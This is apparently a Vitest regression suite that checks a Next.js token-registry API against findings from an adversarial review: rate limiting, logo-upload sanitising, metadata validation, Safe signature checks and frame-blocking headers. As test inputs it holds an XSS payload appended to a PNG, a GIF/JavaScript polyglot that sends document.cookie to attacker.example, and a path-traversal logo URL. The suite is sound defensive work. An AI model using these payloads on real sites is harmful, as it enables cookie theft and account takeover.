import { readFileSync } from 'node:fs'
import path from 'node:path'
import sharp from 'sharp'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { NextRequest } from 'next/server'

/**
 * Regressions for the October 2026 adversarial review of the API surface.
 * Each block pins the fix for one finding; the attack it describes must fail.
 */

vi.hoisted(() => {
  process.env.NEXT_PUBLIC_SUPABASE_URL = 'https://registry.test.invalid'
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY = 'test-anon-key'
})

vi.mock('@/lib/observability', () => ({ reportError: () => {} }))

vi.mock('next/server', async (importOriginal) => {
  const actual = await importOriginal<typeof import('next/server')>()
  return { ...actual, after: () => {} }
})

const BUCKET = 'https://registry.test.invalid/storage/v1/object/public/project-logos/'

let uploads: { path: string; bytes: Uint8Array; contentType: string }[]
let insertedRow: Record<string, unknown> | undefined

function tableBuilder() {
  const chain: Record<string, unknown> = {}
  for (const m of ['from', 'select', 'order', 'or', 'single', 'eq', 'limit', 'abortSignal', 'maybeSingle']) {
    chain[m] = () => chain
  }
  chain.insert = (row: Record<string, unknown>) => { insertedRow = row; return chain }
  chain.then = (resolve: (v: unknown) => unknown) =>
    Promise.resolve({ data: { id: 'row-1' }, error: null }).then(resolve)
  return chain
}

vi.mock('@/app/lib/supabaseAdmin', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/app/lib/supabaseAdmin')>()
  return {
    ...actual,
    getSupabaseAdmin: () => {
      const t = tableBuilder()
      return {
        ...t,
        from: () => t,
        storage: {
          from: () => ({
            upload: async (p: string, bytes: Uint8Array, o: { contentType: string }) => {
              uploads.push({ path: p, bytes, contentType: o.contentType })
              return { error: null }
            },
            getPublicUrl: (p: string) => ({ data: { publicUrl: `${BUCKET}${p}` } }),
          }),
        },
      }
    },
  }
})

vi.mock('@/app/lib/supabase', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/app/lib/supabase')>()
  return { ...actual, supabase: tableBuilder() }
})

const CREATOR_SAFE = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'
const TOKEN = '0xa783CDc72e34a174CCa57a6d9a74904d0Bec05A9'
const HOOK = '0x21A52C56C15258B3f36B6455dA92d1241fB875FD'
const DEVELOPER = '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC'
const SAFE_OWNER = '0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc'

/** `null` models a signature that is not ECDSA (a Safe's ERC-1271 bytes). */
let recovered: string | null = CREATOR_SAFE
let safeApproves = false

vi.mock('@/app/lib/serverRpc', () => ({
  assertServerChain: async () => true,
  serverPublicClient: () => ({
    getTransactionReceipt: async () => ({ status: 'success', logs: [] }),
    getCode: async () => '0x6080604052',
    readContract: async ({ functionName }: { functionName: string }) => {
      if (functionName === 'projectTreasury') return DEVELOPER
      if (functionName === 'getOwners') return [SAFE_OWNER]
      throw new Error(`unexpected read ${functionName}`)
    },
    verifyMessage: async () => safeApproves,
  }),
}))

vi.mock('viem', async (importOriginal) => {
  const actual = await importOriginal<typeof import('viem')>()
  return {
    ...actual,
    parseEventLogs: () => [{ args: { creator: CREATOR_SAFE, token: TOKEN, hook: HOOK, name: 'E2E', symbol: 'E2E' } }],
    recoverMessageAddress: async () => {
      if (recovered === null) throw new Error('not ECDSA')
      return recovered
    },
  }
})

beforeEach(() => {
  vi.stubEnv('NEXT_PUBLIC_FACTORY_ADDRESS', '0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0')
  vi.stubEnv('NEXT_PUBLIC_CHAIN_ID', '31337')
  vi.stubEnv('UPSTASH_REDIS_REST_URL', '')
  vi.stubEnv('UPSTASH_REDIS_REST_TOKEN', '')
  uploads = []
  insertedRow = undefined
  recovered = CREATOR_SAFE
  safeApproves = false
})

afterEach(() => {
  vi.unstubAllEnvs()
  vi.resetModules()
})

let ipSeq = 0
const freshIp = () => `198.51.100.${(ipSeq++ % 250) + 1}`

async function uploadLogo(bytes: Uint8Array, ip = freshIp(), declaredType = 'image/png') {
  const { POST } = await import('@/app/api/projects/logo/route')
  const fd = new FormData()
  fd.append('file', new Blob([bytes as unknown as ArrayBuffer], { type: declaredType }), 'x.png')
  return POST(new NextRequest('https://tosh.test/api/projects/logo', {
    method: 'POST',
    headers: { 'x-vercel-forwarded-for': ip },
    body: fd,
  }))
}

const realPng = async (shade = 0) => new Uint8Array(
  await sharp({ create: { width: 4, height: 4, channels: 3, background: { r: shade, g: 0, b: 0 } } }).png().toBuffer(),
)

describe('v1 routes are closed once v2 is configured', () => {
  it('pog-scan, sign-allocation, ref and admin/config answer 404', async () => {
    vi.stubEnv('NEXT_PUBLIC_V2_BIDBOOK', '0x00000000000000000000000000000000000000b1')
    vi.stubEnv('NEXT_PUBLIC_V2_LENS', '0x00000000000000000000000000000000000000b2')
    const post = (url: string) => new NextRequest(url, {
      method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}',
    })
    const scan = await import('@/app/api/pog-scan/route')
    const sign = await import('@/app/api/sign-allocation/route')
    const ref = await import('@/app/api/ref/route')
    const config = await import('@/app/api/admin/config/route')
    expect((await scan.POST(post('https://tosh.test/api/pog-scan'))).status).toBe(404)
    expect((await scan.GET(new NextRequest('https://tosh.test/api/pog-scan?address=0x1'))).status).toBe(404)
    expect((await sign.POST(post('https://tosh.test/api/sign-allocation'))).status).toBe(404)
    expect((await ref.POST(post('https://tosh.test/api/ref'))).status).toBe(404)
    expect((await ref.GET(new NextRequest('https://tosh.test/api/ref?code=abc'))).status).toBe(404)
    expect((await config.POST(post('https://tosh.test/api/admin/config'))).status).toBe(404)
  })
})

describe('the rate limiter counts an IPv6 /64 as one caller', () => {
  it('rotating the interface id no longer buys a fresh bucket', async () => {
    const { applyRateLimit } = await import('@/app/lib/apiGuard')
    const opts = { name: 'regress-v6', capacity: 1, refillPerSec: 0.0001 }
    const mk = (ip: string) => new Request('https://tosh.test/', { headers: { 'x-vercel-forwarded-for': ip } })
    expect(await applyRateLimit(mk('2001:db8::1'), opts)).toBeNull()
    for (let i = 2; i < 10; i++) {
      expect((await applyRateLimit(mk(`2001:db8::${i.toString(16)}`), opts))?.status).toBe(429)
    }
  })
})

describe('logo upload stores pixels only', () => {
  it('strips a payload appended after a valid PNG', async () => {
    const payload = new TextEncoder().encode('<html><script>alert(1)</script></html>PK\u0003\u0004zip')
    const res = await uploadLogo(new Uint8Array([...(await realPng()), ...payload]))
    expect(res.status).toBe(201)
    expect(new TextDecoder('latin1').decode(uploads[0].bytes)).not.toContain('<script>')
    expect(await sharp(uploads[0].bytes).metadata()).toMatchObject({ format: 'png', width: 4 })
  })

  it('refuses a header followed by anything that is not an image', async () => {
    const magic = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]
    const html = new TextEncoder().encode('<html><script>alert(1)</script></html>')
    expect((await uploadLogo(new Uint8Array([...magic, ...html]))).status).toBe(415)
    const polyglot = new TextEncoder().encode('GIF89a=1;fetch("//attacker.example/"+document.cookie);')
    expect((await uploadLogo(polyglot, freshIp(), 'application/javascript')).status).toBe(415)
    expect(uploads).toHaveLength(0)
  })

  it('refuses an image larger than 4096 px on a side', async () => {
    const huge = new Uint8Array(
      await sharp({ create: { width: 4097, height: 1, channels: 3, background: '#000' } }).png().toBuffer(),
    )
    expect((await uploadLogo(huge)).status).toBe(415)
  })

  it('one /64 shares a single 10-upload burst', async () => {
    let ok = 0
    for (let i = 1; i <= 20; i++) {
      const res = await uploadLogo(await realPng(i), `2001:db8:1:2::${i.toString(16)}`)
      if (res.status === 201) ok++
    }
    expect(ok).toBe(10)
  })
})

async function publish(body: Record<string, unknown>) {
  const { POST } = await import('@/app/api/projects/route')
  return POST(new NextRequest('https://tosh.test/api/projects', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-vercel-forwarded-for': freshIp() },
    body: JSON.stringify({
      txHash: `0x${'ab'.repeat(32)}`,
      signature: `0x${'cd'.repeat(65)}`,
      logoUrl: '', website: '', twitter: '', telegram: '', description: '',
      ...body,
    }),
  }))
}

describe('project metadata is validated', () => {
  it('refuses a logo that is not one of our own objects', async () => {
    for (const logoUrl of [
      'http://tracker.attacker.example/pixel.gif',
      `${BUCKET}../other/x.png`,
      `${BUCKET}${'a'.repeat(64)}.svg`,
    ]) {
      expect((await publish({ logoUrl })).status).toBe(422)
    }
    expect(insertedRow).toBeUndefined()
  })

  it('accepts a logo uploaded through this site', async () => {
    const logoUrl = `${BUCKET}${'a'.repeat(64)}.png`
    expect((await publish({ logoUrl })).status).toBe(200)
    expect(insertedRow?.logo_url).toBe(logoUrl)
  })

  it('refuses non-string, oversized and control-character fields', async () => {
    expect((await publish({ website: { evil: true } })).status).toBe(422)
    expect((await publish({ description: 'x'.repeat(501) })).status).toBe(422)
    expect((await publish({ telegram: 'https://t.me/a\nb' })).status).toBe(422)
    expect(insertedRow).toBeUndefined()
  })
})

describe('a Safe creator publishes as the Safe', () => {
  it('refuses one owner signing alone', async () => {
    recovered = SAFE_OWNER
    expect((await publish({ website: 'https://owner-phish.example' })).status).toBe(403)
    expect(insertedRow).toBeUndefined()
  })

  it("accepts the Safe's own ERC-1271 signature", async () => {
    recovered = null
    safeApproves = true
    expect((await publish({ website: 'https://project.example' })).status).toBe(200)
  })

  it('refuses a signature the Safe does not approve', async () => {
    recovered = null
    expect((await publish({})).status).toBe(403)
  })

  it('still accepts the developer the hook was deployed for', async () => {
    recovered = DEVELOPER
    expect((await publish({})).status).toBe(200)
  })
})

describe('the admin config message names its deployment', () => {
  it('signs the chain and the factory', async () => {
    const { buildAdminConfigMessage } = await import('@/lib/adminConfigMessage')
    const msg = buildAdminConfigMessage({
      chainId: 56, factory: '0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0', rate: 0.5, nonce: 1n, expiresAt: 2,
    })
    expect(msg).toContain('chainId:     56\n')
    expect(msg).toContain('factory:     0x9fe46736679d2d9a65f0992f2272de9f3c7fa6e0\n')
  })
})

describe('every page refuses to be framed', () => {
  it('next.config sets frame-ancestors, X-Frame-Options and nosniff for every path', () => {
    const cfg = readFileSync(path.join(process.cwd(), 'next.config.ts'), 'utf8')
    expect(cfg).toMatch(/source: '\/:path\*'/)
    expect(cfg).toContain("frame-ancestors 'none'")
    expect(cfg).toContain("'X-Frame-Options', value: 'DENY'")
    expect(cfg).toContain("'X-Content-Type-Options', value: 'nosniff'")
  })
})
